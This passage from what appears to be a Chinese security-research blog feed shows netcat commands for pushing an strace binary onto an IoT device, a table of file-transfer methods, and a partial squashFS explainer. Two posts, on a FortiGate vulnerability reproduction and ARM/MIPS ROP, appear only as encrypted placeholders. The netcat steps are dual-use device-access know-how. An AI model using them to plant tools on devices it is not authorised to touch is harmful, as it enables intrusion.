class="code"><pre><code class="hljs bash">//IOT设备<br>nc -l -p 1234 &gt; /tmp/strace<br>busybox nc -l -p 1234 &gt; /tmp/strace<br>//主机<br>nc &lt;IOT_ip&gt; &lt; strace<br></code></pre></td></tr></table></figure></li><li><p>wget</p></li></ol><table><thead><tr><th>方式</th><th>是否需要设备出网</th><th>是否需要串口</th><th>是否稳定</th><th>推荐程度</th></tr></thead><tbody><tr><td><code>netcat</code></td><td>❌ 不需要</td><td>❌</td><td>✅ 高</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td><code>base64</code>+<code>cat</code></td><td>❌ 不需要</td><td>❌</td><td>✅ 中</td><td>⭐⭐⭐</td></tr><tr><td>串口传输（<code>sz/rz</code>）</td><td>❌ 不需要</td><td>✅ 需要</td><td>✅ 高</td><td>⭐⭐⭐⭐</td></tr><tr><td>HTTP <code>wget</code>&#x2F;<code>curl</code></td><td>✅ 需要</td><td>❌</td><td>✅ 高</td><td>⭐⭐⭐⭐</td></tr></tbody></table><h2 id="磁盘查看命令"><a href="#磁盘查看命令" class="headerlink" title="磁盘查看命令"></a>磁盘查看命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br><span class="hljs-built_in">df</span> -h<br>mount<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>飞塔网关漏洞复现</title>
    <link href="/2025/06/15/%E9%A3%9E%E5%A1%94%E7%BD%91%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/15/%E9%A3%9E%E5%A1%94%E7%BD%91%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4001f699e76246dbfe0055bbad6634fb110b247154227d9ec274f991f54eccae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ARM和MIPS框架ROP</title>
    <link href="/2025/06/13/ARM%E5%92%8CMIPS%E6%A1%86%E6%9E%B6ROP/"/>
    <url>/2025/06/13/ARM%E5%92%8CMIPS%E6%A1%86%E6%9E%B6ROP/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4ac2f8f40d7878bf7ae3f061c9907db4048e2c1b0b26bb425a1e6586ba889648">18b89f6f8c4c5166700dfff23b00ff16a3cb373992f87523ac1159c0e9384ac524d75b5127776293d69e3bbb2b2384c9bb5dfaf8046bed90769b466c3e4a7b038c6cf10523eede12233b4ce7b75f9d5bc882edc1ecda7e21cb58a032052ba4c58d0fed1bcb97ba12b4ea06ab68e227e6564f19042c285734c6f900742f40e28f56ee2ef4e0d742d692564017180fc91826ad4e0d318bffcb49ea129f0e09430b99cc5a698d8d941850ba206518fd0c47cca8ee1cc0f321cf1000b72e6e4aeae207308bc2897145e8d32c4abc91c1c8599062589beccd214a50d6fa8e5ca35e26664f94d1d4737a7bc36b38442feb6e3ee5bb703f3ae9f3e542ad9ddc68a3aa637c07f21e8f13e43825db9ea18fd6d4c957cfa5cb8de331c5acb70ad93a52e6bdb9f119117f0aeb39ef7cc6c14fed85c9d51734be2535674fed34dfcb269b9174d84ecc822c7fa06649f1f3c1a72b77384802c5c532234eee09588f8e195f32a722b914f99671e34602752679d7aa3e7859a709c03f272e68c12e83d923f2b804cf61bd4b029a6235ba05e44eaa6305175b67b1b479b2f8bcb1084b4a1bcc0ad6da12d452a650c4d90f877b6df6aef7b5acf849b10c553d9cf81b18550a5faab00a3feb38d7f6dc6d6702390908c5e27e13c755c00155ab7055fde12d27380d6b691227fc66603818f02f0363de997d58cfbcbdc108221f9d425912b86e418a85d48c98eee62af6247cf620d823ace6f0abaf3677ebd2043c41ffbdf0474eaf2ba4d3ce7f78b217f991fa7f704cf6ec7cb51dec0306664811531ae555ac44558d47c45df7bca3a8161328063e4d2b892114eaf7f2bc01aeeca3bf57f3eaf7da54a6ec6bfb4d5712b745ce2448da37e1e040737b00ef7c4a58885e5fab3d8950162367ddffd39e27959db8869dea0b95bc394bd147fd54fdf0f09ea4562041007bb4d39231e41269394fc2233869bdb794065425e45fbf666e19d5a4fcafb00d44e6577495c3c83bd1285e8179b799b4cea4d8ad55bd9040400123ff9c44b8ed3894d2cd76791660b64332d3b17a9aa5607454f4463f2caf8da1cad48670fe7615018d06eac3b186d62aa5c5190df68e43485de055d60fa9845d59bb517aff67e50a0c5748181236836c06f35e04cfc3a2b27372a46519ce589f3d273b8e73f7e88a57568260871d015129c914853009fb292eefb458f794a326130110d4079249677edeeafd426a254c6b80bf88f1c4504abf917dbcd47680b0ce34231fc58cfd17045a82598522212cdb17856d342f29cdd1890d28018e6a729a75c3c5d18aed42173c74fb5447c8bc8916c80e82f9ffdc92c3f903fa5e315bb02472c48803d6a6db324c26143a6f075b6412a7b882bcb5b397d17589bbc9eff7aca3729cca7979e8053eb0f9c2d8237316db090d41f3d77cb19fd582ba56fb122fe4c4dafa6b38713facf701f70d43f8cfdde8678b3efb5b2b599d7890f173dbda7ffb87757a168f14ccdb71f55e6d405d3c1991cb834b8bebe729f3ba381a83c9bb823b1fb4840a24d184146b1748e899c4eabe8ab508591614ec502863bf34e515d835f45b37c19f6873836279e54f05ff0a3bc0ba9232e9416441950c7a8d88733f0f4b7aa012364268409ffeef153798366f710ca0c5232f405ad22c6c0702dfbc4f73cfe4c2ade89db935a8065173f2ac8a76f992b04eef37f1778cdf808fe93c30aedcf5c9beeabe06ff807ab0884b01ad1db47c0700e092f9d88ce38d51c37fd035f8b0fbab0a14985b322df8f8b14e98c36603d8552847bd61fb68ed615974117d83a6eecce2e6b39a95858fe462e818915e45358dca832102698b0587793fb41ec4236cd71699cf0c983dfe9d186fe69b4d75e3b8add02811ee4e2e064c431611c2c19bf62bd3fe791924e64fa37d3df0b165c5e8d50b5eecf68ed3765c72f256e354df33f117819d829c98ca546d12951b9b7bdca10ad9308714a5b7d74c906327ec4561bb8e369bdd0217f54cb7cc37e6cad20d7e853e98c348b5707d782f5568768cfa78f9afa992b5db5a337617c7a4b619b1c9b2c409c15dbb3f93779abc478e76528e194c21198e8b84d090a3323dbd5193906b85027aa952c810a9d7c7fee68e7d27d73755ea3865fd6e508ecffb36e975df9d6d3e14f94d67b275c0dabb57992b0263d7d27ae21d67753e8bc51d178f0dd7c2496cf77587b2e5a386b04e58e42b25a23e62ebd7c75d9bec99b5a66363e0d61041b926fa6692b907bc73391f2f6ced520ac9bb4e659eea517d504e98b1ac53857fbf831d9bd5373e20db7327046364ec160e4816b8090b74c2c29616584c249baa8a16ccbec87e2da9c57037b3bb678f7b1fecff4e939a701f82d0bb18ac9972aae874bf0a8408166e6b6e57e0421265bce5e409614a1b0247dc8638a5b3124ae5c5564a4415a5627616b4f85d5ab93275cd83620dad2a92e283ccabcdba4c265c70f1f1c1d9fd8e540f0e6517487e9d77bfdf400546eab60de3600c7723c8e9866ab5f91794a12f2940ad5b11e7ca09e2488982ec4f02748946287a40be69ba3219a1bc6a3b881be140298e061d28d9785bde1e1f5c20295d9df77d7715b061c3d0c6bf036b506ab0ea5bba0f9eb523a68b6347d31683c7bbab2ce699482aa44d9e00c00a13e49519266d73df3959ce346510b9f0bc1e316e14a7025f585d6b77188f4f935d9576c3018119897bfe0029599e7963387ce4167b2852d6f2d1dd8c856aca301db0634f9ed6756487335eb9fa85a355d76897c544ac253f085921e6ab38b115309921a36c7dc4dc6a124e1d25911edc354c8e3d8b948cc4ad89f3be81283189534df403b9c23e9e59d35e6637844b7892edc190a52834510a559e722ebb001c8769e06bded6fd4e682e0311aa6aff3d36c1f6e01630d94d4943cb113afedca5eb27f75a9bd6771766edde0529e77c7ec3cba8be18ce0053ff6947fd1daa4e51f5d174c2be650a1651f18d775dd54e08184ab88940c9e580ab724ede095cad0dddf1d4e8c527edc4029e5042b345f72b455e0db5effb417669f58551bf140333861c18b241c98a996ea6c1723965638846b07305759558fa5bfad96ee5b62325db68360818914f5ea2fac3931a39c0bab042cff3f1681641f9f363f51e84eed1ed7932d2ad0ba41a6819434fdf9c3e5cb860ee2160b40a2375379c0ca363f0f5306ddf6c680497923d947dfe50d5112a45e80925ec1b8e87c30cfc3fe1b70f49aa0d539261e83d73204beff166b338c7cd0b49a8217b2caa473ab69aa6d143c5ff3918fe028b6fbf8f6ddfced6cdd0fdf7a6ae1fe1dae2f09b91f1f09872eee2e93d0cf349ff52dd7b7387823727902e0d2adb53bb66a22fb67c61e37662ae1fcfb21086bb891024a40357a81918ff84279592efa33529dcafddc7c2031a5aa0857b0671b9b3cc02946422aad820f51a624be904b929b724c6418dbf4e5c8bd03a90db03e12405eaa173095193767c1fefab85f7ea7631f9d34fac39a5c738dbcc954d42be71cfa408d21d51bd8e1a944a359cedf65630e03051c59a1866a751a842cfb62c10395e77322170bdf58c943bf6cc8befc55e31e2edf5d8fdfb91c44621fb1d992aee895d0acdf8adfdb2474041ae5f384295d92ae80a37391e449e6e52603aed8bd36523d0fd625e8e2ff1b955ca7b457be401527242735b49f11df5c311db756acc56466752ca22cf92f2f0193c70296cfc9b01dbb176ed2a98c4f92bda8d53b77f26f8f7ab98a3381c831f1efbfef70ebf37050cbaa453802d33476a0776962b6ed7727d5622a868ee7a03d97f4c6b222f628e1673f77f3bb2afbe36526959e0e78f31bb14ce91db219d741340a63744c1f583737fe7e0654f83b5fc9436a9a38aeef42d39d68913280c7aa7b14d3e9f08629374d011cd247fe78eb78cdf1d7198368e8b3b15c3f63b1c1e5686a87fe32998d33f8f25aed24eb06cebc877d39875abdfb49dd15e6e4d93119d737960b163102c6f7fa703f11dce48ab0777a2243ba8ee14946c960c4540881a34bb578b4f2bd5390e7d84a767db06c2584ebffbfdcfe1e3a5ef7986cd7ab157d6160d5a61fd62b7cd88ba91e66fc70eb33fa8683e701fb003a69cbda22dc2a5efa613e812a32d8c7c8233ca1d5c2c9f7b39781867ee69e67747ac0e207826b7353fe00d16fb9def7fdf3deb8181e107b0d2c0033ddf945b5345118977356854a4de05ad43d6f89a969f84305a2126b164c55e6d0f0014f37f95aeb4764918a4006954ada628481342da74a9e19ea3aa9566e9cda6bdfb2811fe91834b4b74c34a0c9048459b0b81d5325e9bb77f5fe662234e8b8030266be830a19c518ce079f57d743e823d2e759e876aef24376a9757c067c21864ed16045f8f533418d8317dff5a31723f02ff489bd9524bd3f6bf96b3d95fcb50b04bc27d0f628f0cbc4ac741b3e93870ad664654db4cb29ad01e35e99233f2204aa72a5b04b0649cbba5f0fa8183fd598b11931b57bceff4b82214f0e866fe2813a6af28cd15227988f232004aeb9bb959e5482d96dd327f9adfd3e26560ef6909d61de3af65b0abfb667e05b49eb2497b6212c8a27f53f22f1103eb8a76423a0212ff9a8e142513b30bd1f1f987935e5b1e67380b40a4e46bceeaf9da3ad9aeae7aecaac814693c632cf2facefeaf869b1f9a855d9659b0aa665fa4c53fe026ed128aa0aa3132f26453c84376138438a4a9180e4547f78285076931c95c6692210601ae0f974f6d5bfb6f08f2efc93787001644cab29355b6e43a968dc88768d3154d9f1a9bcbbe46f07d218d66856b1864479d12ec178c14d4040d38a37c5aedbce10ff01199558f63190ef0a52f5e5b5a2a7852accc4863e936d9116466e4920fbb066c78e690b01be46c1ba00feb275ffd8209f8f40ab41a6d1c8647e1ad87904dceed00f1c4cbc63ee2f899c434d114c0d81ef05770d36cd8a88b67e8142ee377379e512a79ecbf5e77bc4ea63ff112373e6886bf89a46130618938fa10adb2a6fb58c87fa69e65341e30bc4dbe05723c8bd788e461342c15aced6fc4bf5171952ed041d87345efc503d4978cf0487613d1e00cf9366ba653ed06862f054d5af7917ad066982dbc876ab60731b7eeeb508126a7d64fae3018afbbc51655a2601e5e7515e2741d26919083325b7afa136a90a794c52f53b58f06dcd219e8014f828950dd84e0359863a893c609a0f40f513fb63e0c4f92f05c1f73ad66fe92613ffb928a0788308419a2f360c729107077cd3020a91b39078ceff9fabadb153d643a08073007a40f45462fce047c73c7f522b5ea26411ee84aeb46d3eea0cf88415766da9c0f65bbe3675d96efd10869aa0ca6bd3a7682c158446b4c42a7516ef84c5f789ebd65fe176c9b0be4f4c1f0552744abddfa9927541893ef7260915a4bfd9dc21252b027ebb3c9b3c2eec29885386afa70723ece4449cc1c2eef9314725d1358a94510cee29a046a51834b2fd36dfbf358bcb4adcc89cf7777789596feeea9d122e5d9b2cccf6429280153d15ec332c9f27d21074081a418cfbeefe2159fd19ded429af562f339154d42e89928d905248be2d7b596cbd454e3c87ac44c32b9370a270daa7de2329aaa88ce860bc882f6ba652425374dfb91222d5a6232ac5f042281df5e85b430319b28f14de6ea1114fb6bc608beeb185696e2c5d6685dfbfe21664e503c664cc557fed6b7932dd0b33ec6b3726cd8a899735e6d8a335c038db80aa0a6df9e8cdacbbdf622738220645eab1d2aa9e3cfd4363bd47f2355ec40f1590319aaf6f0600da4d1ff5f4e4b3f45d8b87cdca17ac8074cf50794a3d8cf103b98f89408d5745def3d6f88c4e53438e64df44134b5469aecb2c67a7232b72092031eb38e38f97ce0f94874fa48a99394f20e80ddd639e4c02b7be47b29e40d1850af43ae0212ee100d79cfb81bcca135d6a609f011ae405a5aa58d5b8effc779c56d1c8c0f8b46e702fe4f3df4d2ca358ad94f097053aea054a428c79b031b029c407a041c91bcbf2e5a6503f42f32acbf84b8eb780dc130140bc1cfaf2ad996c794b262826fa812cce7ccc01c23ac766ab1d15f00ae403df3fa692df48e93690f06e3044c5452afa7a5c138299beb4123deff924c86586866f0feb82a1cc57440bb8396de33e18e72c473ff926fab1a413befcd77f30660e664ae74f77689744c5c3fa56b1361f4971d10911ae542610e0fc49d6cf2245b3d702ac18cd98e74f3404503c01c56b5b0871ce8e2ee1b4b26bc789d5034d063df5afaabe410cfc98034b72f4f96142c8427c0438672cef46a80c79fd07638ab72ef04ced7463e39237671b5b73d1ea0fe173e60b14fea01d87a6ac4792f4430e2dc81e82859f9debcbc7da2fedce5765f4623387d13e5d6865c9311e81ebf3d6302336bc6af95726038e13fdfec5b0b286b7584dd897a0cdba3f42238265ffb3237fb374d6f95402d613490d3c8fa67b1a31634361e4382fa89b2c858090b45a5dc55dd5b469b503710fca44965c85f4cd44df60102656fdde254041c0e67c79969afc539dfb3b01d58fd8aaf77ba3ca085ae20a8c6cba26ef9aca55513bb3d185ba5963b230957e22e895272f19a84d83a3d03590409bbc7f2e4cba9b361ae92159250a794b9f4937920301c2a754742d53faf189e22ab2498badabb15597a371b6d8eab7b31494f2c3c1f81190ccef28c239b76127f4343a3495dc90fd62ebcd1ec4b699e8aef1f39121ad5d10d3bb12343fbf498888d2cfbdf6fe9ce01763b6e0c77ca347aea86bb0acdfe2a703659ed448386e14121263a7353f9e910ab4bbdedb233d8bf63dabc27b4a45073d9b1a022bedb2c0bc485341e914c8a4fa73af7f94852bf76390f5b40b2a5d061a023eb01343eb497b577bc7516afbb420b52f61cd468b3f2793cdd4997b53664b77cf772f41fce6d86efd24952cbf05a12308a5bae416cd89ae0ce4850292a3ea1bd40396c977944517c4f163b460639d12d36af9256871128555c4c5ca5f32d016cdc4f9f46ca8dfc7466631f6108d70da7b91e0595f0326f92f160182485e1a828838cb97b47b84dfccf052b7bf29d254551a884d94ee723f3d9041d77b599c1a2000f211acb177b5674ef50166e75d05fa187f672c4bec0325f8c22e53264b869ba11d7c7300a60951f2ae280a14e60caefdebfec03043e3b1d61495867b2cc4d8284bdcff68cd4b7b6c5f49da88fe4ff35fcfc849bca5064c9453bef58ba7f7bf7253f6b767d128cc006327b43f1f0fc9a0ea507a39afc92a2c19590203a745748b8a421f56515a567007b0242ab426cfb05ecbe5be658ce9208a96acdfa0506d56f6cebf929359318652ebe2b3935dc0029d04925eb493167bad209a3a54008635917b0570d078f5ac5b38c982e34677930a31eb8329ab0eb31de593fdae5b71f1fbda2f90169ef44dcd549159d30d8b75a740a435a3bbca2719c2ce23eb1a544f3cd4c9c050d8a0e34e105663672ab9965eec9186c2460ab6accccb01f4d7291d16e95d38e3e2c89e2a4c4fc1c7c3e8e5f80d1e2b92b1ddd836454c78740a574c96a45cb33cf73ce1782b3dc42c2dcd70364a6570c5f51e06049f71b0c126692c1c86170c602cb29084ef787cdeee4ea8ca001238138d4d91a30981d8bd18c74e4a05776bfdeff1c6f73e8571611ef10f9e8e51bddd3658c3abb42eb61aaa3fb7b6cd8d15b9252bf25991fb7ddf67d372acdec81a4dca3372e945c01781eac8e5634dd6623f97065127140bce5f20417a65abc7138db040010fa99d4a953109b02506e7f5e1504cadf97c704cf7a0e5953206c38c0bf65647215ee9b7321761b4bb20a70a5df5cf133d7d82251674a93d62d53bc3155f4737283ee110a682527b75d05f4897c71c615c66327c2f91fbbf44afe5ea2e164d81dd675eedb12db06324acdc0b8be293fab0dd17ae60ba850392e9ab60c42beeacd49c6aee78e4dd9a8097f66128ae816090063a39a6a50cc51178154c4f9cf51abc18443a1b2284c56c5b7ddad82ac8820ce7eeb2faf6e2fdb6b807032ade400caa396d4dfc834583a5f1ec8549426c553f4765243a239828157165171ed014af7680ba101dd37f050ba5e2c04085eb59713a7b9fdefac7e182e93411cea47f6abfe47559310b0a9897419eeaea0c5488bd77ad2e993d7f3d2c76a42611ece9493a2a9add8898c2d45a506d8a63c960e6a61e51ef60fd2079521eaea89b1d13f20b1854e33fd90ab841a7a1f14b87ff2c54d19858f671de84245733fab3481eac1918a7a112541aff68cd9877858067e6b00a436c5d0cc341bd3da26f161f5c8b34a08dd1b68e5e2c942da202e06e82107bd7db25b980c1c23a01232b506555091df7b97576c300b96b6f97b21128acb598fe11aded568f6d752998842f5e9d0cc58907b5a2260ec352c42446a776c12702684b8cf8c010d41e5d69ba34cebe7cb0eec889e0d4a4965aed609eda4ff4eab251a72a5be864d2608ff67f078b9444f7263d7b611c1a2911c2f3383f99c5005357cb3572a790ab71511a6a5a30accd38adfac3af5c5391215df687d1ebcdaac8525297c32fef82ea28c1b8ce0da3f449d534d0b622ce58085983da0e289e32655a46be2b75518f925bb57e600b2a8214ed36b1fbadd3aaceb50869d007aa19b84a68ac7a498297ab8f1897c0ac08c2e0d15946fca475524dc494c287d4a5ded4d0b8111e03dcf06586004c25fabffd219306bde7ad769342984ac456a29fee99d1380e0670a8396de48405381523d79b66db475b6eeeda6ee1de779b61fca49f8719cadcfdcdc76045a663c883fb0d6285d800ce52bb8e065747b949373f4e7030caf5d8b0cecc86a8324b25f429cdcd72e84ea41991a622e9b208fdb79eb77898ca6180f001af54d0e6322fa8169b4f28f9e32e615bed63741ba548f4f73927282d3e21cce81913cefc1c06c3691f70c79f12d5bf6aa2c57b14a0b7c9bad26b49bd8c47839a2830d530c050148d352a173c9d12e5db8e7a370cbfbc28ae7e81682a0e9355ea1d4e9a9d205876ce89a13b39a7a9b55673c179da511e2b22c7f1467e40edf4cec828d24bc9fa231911ca87e27bd5e3ad06a4a9dbd4f45478951a7b6016d4f2bfd21992e7762f0e283a0f8a9787f3fa00b250a0d398e04e021d0acb65a6ed7f8ff7727867a014d88ef0c205232ccb47637a2ab3bd382cb6c634a32b5c132da9b20283e50ea54e46c360d9204734d46692a2b5bb97d09ab11ed6fbab4290596dccb87da2bda03b4a232af86831a96d1957f4d64d22f28fed66df7ce638865805e5972f2e49f7ecb13a166f12f63ad653ae9ddeb7950d85c0d8adeb02dcc6aecb907fbdca085e721a056a7fc24b6202ba02a33ccbdceeef7c653011a4846e04d7f742f72b4add2b9e6e250b00e5175d6a28facbb9b637496a3eb60f90bd1a03cad444ceee668a60d6fbc84ef6a5d91b2a4d3860debef9f6f663560262ff7321f39c02976d8c61a3db465448944ae856057c8524deb663e802111c35e44006b4ecd6ca638318bc83b84eed3eaf08639f471d711222014a0660fb03b0ee612219cbe2dc0e678d28d4d70f60dcd5a1f41df1791efedaa96f7f9fabfd7b49165c991c76575030e946a447f8ed23d491e59b77e28e65182762f3fc294a57be6112fa760a8b7121cf8f1ac0c26dd1e77ffb071d4a8d3c0d9eb2ffeffb2dcbef557365502dffbe682a8aaa386381fdc2df159a26cae76816173a94637be6ecd570d81bd2f4f6ac5181b64d3ff44f94cde57fe549b8abf116da813af681b0e5885c886bda1f6f0b7db6ee86c7258c799f87ffc3c153500178477dcf778e6d1f7b08e5f7a69da964a4ed41d6561059f913ad19b149e1c615ae8053fc99e7ffda3f7ec1a76242a755bc1ccd7b1296b72cc2aee832d77f4ddd9e1247d14b7bf21ef0f43c5c793f5231665df403f6a2261582323cdba7e3f87ddc3988ab6896d1484de4bea9885d62e7bc9e562402bdd889a634b945175ec2cf0bf7521e86f0b966d0d5339dfaa1c2ad6b78ff2cb61f4312330331c1b4953191d570d1c89cd46ebb76aee33f336c788e650a4e9a20d2ad0efbdfe776e8c63e04786c3aebbf5b28954ac9e1633886270c0e63b7ece485b7bed013757bb9642d5b2ceec80c6a542bc75e901d1abb1928dc37cebff50d540ecf4c9919479d759edc7fe9230e5e08dba534d371e49714615097ba9e4f3f5c7b022362798a58ca3715ca8c2b8a8105df5ee1b178bce10d9ee73ef38ba602ac4f03aa39989a798ca078e44d3af725c74f060df6aba9b30734337df39d8c482b0ea3811d0add05477cd2d0045e7a406ac4c4b50f1e88d31e668c76c36b467985aaf18794fb5189678413c302f498e4d0c7819bdf28c790099b291200212ff39b4a5ae026a2432ea1062f292133de176dd3650f74b08e2f91a22479131a205ca7aab2f461fd9f1634f21ecb4bc6f43ff0b6dd12d7b71222bcd291fcdc5861647c865eeb827e757aa0fb740e83384dcc08e813679a3096960ef4e18e1bf926b36d71ea25372a184c5dcfe71bd666d2ed81a41e23b1fbca38fa167a44aa110466151dd36a4f370784d9e4fa2ec710aa4dea90ab82e7c1c9c138f30bca8cebd2ad056550c06b2f3a8711e4ccef6c53c26bc321959967ac579bf22a134a1202757398ba681c315cb3725c4f983d5583622abe7e19953075b4838c83e80340669f1dbfa4c9eec0d41135b4313479897850c4ae4b1e622b89bea91b1365b6999d03dc7ba900b8057b337952aad65112dd1a294a10d7806d7bd78499b24f3ae047422243cb8389461978d5f0a83ce58eaf529d57fe61c5a605c830f725d17d9f4c189110781fcc31ff844b4e88b98b9029a4071ae597916e57e1385c8a41f4488d9a49efa7abbfae5e27fde2d3a7e75f656a1a266759d02dbd889f0b3ca28be1eca74a4bf3477335f2b26d0b0ddafbe0937b99eeb77a7c9b8848e7d6ce2db0666f2a7e44740fac896b409c39a9430dde7aed84a19bbd8a204c29beb83f81a5ed9c7cd4997b48248af30b42c57ebe0325b5bb5c7701305c436378c4e1d4769a5385cc07fb883f431906cd6ef1e64f03472071db2b96a3b261222dc82fed3cb0ea818ccc5391b026efff0c8d1810508d6ca5d3070df97cc0f3c9efdb17769feeafd79ca99dd8bbfa3a080996dec2a09fa2bd65ddf53f2198ca298a3ee1bd37a3b2402fc1e4e37d2cc146b8aa5dae0a81ee54a0c0af35c40ff2b7034794deced7ac6df033a7bffefacc38eb2dd6a62554d0642fbfe0e4e514a8877c7577780ba00a3083532f5bf263a3a466c701323e088237258de667f9ba08141563748d515592f2aee6c7548ee1714aa61cff770028e2406c49af2e15c0122026ec0ff7f1cfb2554cf67e83988e71d46ede6b09aa879642bbd39e0a67e59ae7c553738c897c0bd28237eefffc8438141997ca8295ee3888ed813077ac9da4f2fe5b2269336e68f547babfab67eccf88d1d3230cb7cde1e2ffe59fd991f89a7ce747e4f60937219e6d6836e53d813124fbc66342cbffa345c7826a488c03ea406ebb418b8319bc76b5aec5d917a4a02388d127a64dff0fb7ce6702fe429804eec2c2309bb8490dd3a4655620497361f347a477a7f03bd629ce188669c9dabac013edbf85a6030adf34f102fdb74ffaf16a352d0f5d4649dc2810b9d061a6b1d52ad6195e0c75315d00f752416a21b02f14315e8f1d47d1c898d3240ddb5f580fc8be0d1a2da016e99534497c3801792f58ea9c32d2f0ef02e9f3fdd12fced0a4d7344b7c157380022dcd13d3165310a54cfdff45f04210906c43f37c150e901fdd79ec0aefdbc2fa44c030967d5b9618b1717f76ef2bd1e018a339587a445971dc62a4f371d88bb2c7010ea539e1de7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>squashFS 文件系统</title>
    <link href="/2025/05/23/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <url>/2025/05/23/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="squashFS-文件系统"><a href="#squashFS-文件系统" class="headerlink" title="squashFS 文件系统"></a>squashFS 文件系统</h2><h2 id="简绍"><a href="#简绍" class="headerlink" title="简绍"></a>简绍</h2><p>SquashFS（Squashed File System）是一种压缩只读文件系统，广泛应用于嵌入式系统、Live CD、容器镜像以及需要高效存储的只读环境中。它能够将整个文件系统压缩成一个单一的镜像文件，同时保持对文件和目录的快速访问。</p><p>该文件系统最初由 Phillip Lougher 开发，目标是在最小化存储空间的同时，提供良好的读性能。SquashFS 支持多种压缩算法（如 gzip、lzma、xz、zstd 等），并具备块级压缩、inode 和目录表压缩等特性，使其在磁盘空间受限的场景中表现优异。</p><p>由于其压缩高效、结构简单、加载快速，SquashFS 成为了很多 Linux 发行版（如 Ubuntu 的 initrd）、嵌入式固件（如 OpenWrt、路由器固件）和容器技术（如 AppImage）中首选的文件系统格式之一。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>SquashFS 作为一种专为压缩与只读访问设计的文件系统，具备以下几个显著特点：</p><h3 id="1-高压缩比"><a href="#1-高压缩比" class="headerlink" title="1. 高压缩比"></a>1. <strong>高压缩比</strong></h3><p>SquashFS 支持多种压缩算法（如 gzip、lzma、xz、zstd），能够显著减小文件系统镜像的体积。例如，在嵌入式系统中，它可以大幅减少固件大小，节省宝贵的闪存空间。</p><h3 id="2-只读文件系统"><a href="#2-只读文件系统" class="headerlink" title="2. 只读文件系统"></a>2. <strong>只读文件系统</strong></h3><p>SquashFS 是只读的，这意味着一旦构建完成，内容不可更改。这种特性非常适合用于系统引导、Live 系统、容器镜像等不需要写操作的场景，同时增强了系统的完整性与安全性。</p><h3 id="3-支持大文件和大目录"><a href="#3-支持大文件和大目录" class="headerlink" title="3. 支持大文件和大目录"></a>3. <strong>支持大文件和大目录</strong></h3><p>SquashFS 支持最大达 2^64 字节的文件和文件系统，适用于大规模数据的只读分发。同时，它能高效处理包含成千上万个文件的大型目录结构。</p><h3 id="4-块级压缩"><a href="#4-块级压缩" class="headerlink" title="4. 块级压缩"></a>4. <strong>块级压缩</strong></h3><p>文件内容按块压缩，支持不同大小的压缩块（如 4KB 到 1MB）。块级压缩有助于更快的随机读取性能，因为只需解压相关块即可访问指定内容。</p><h3 id="5-低内存占用"><a href="#5-低内存占用" class="headerlink" title="5. 低内存占用"></a>5. <strong>低内存占用</strong></h3><p>由于采用按需解压的机制，系统在访问 SquashFS 文件时仅解压必要的数据块，整体内存占用较低，适合资源受限的嵌入式平台。</p><h3 id="6-支持多种平台与工具"><a href="#6-支持多种平台与工具" class="headerlink" title="6. 支持多种平台与工具"></a>6. <strong>支持多种平台与工具</strong></h3><p>SquashFS 具有良好的跨平台支持，Linux 内核内置对其的支持，同时拥有成熟的构建与挂载工具（如 <code>mksquashfs</code> 和 <code>unsquashfs</code>），易于集成和使用。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Superblock-分析"><a href="#Superblock-分析" class="headerlink" title="Superblock 分析"></a>Superblock 分析</h2><p>在任何文件系统中，<strong>Superblock</strong>（超级块）都承担着记录文件系统全局元数据的关键角色。对于 SquashFS 而言，superblock 位于镜像文件的起始位置（偏移地址为 0x0），用于描述整个文件系统的结构和入口点信息，是挂载和解析镜像的第一步。</p><h3 id="1-superblock-总览"><a href="#1-superblock-总览" class="headerlink" title="1. superblock 总览"></a>1. <strong>superblock 总览</strong></h3><p>SquashFS 的 superblock 长度固定为 <strong>96 字节（v4.0 以后）</strong>，其结构在头文件 <code>squashfs_fs.h</code> 中定义（对于工具链如 squashfs-tools 或 Linux 内核中的源码）。一个典型的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 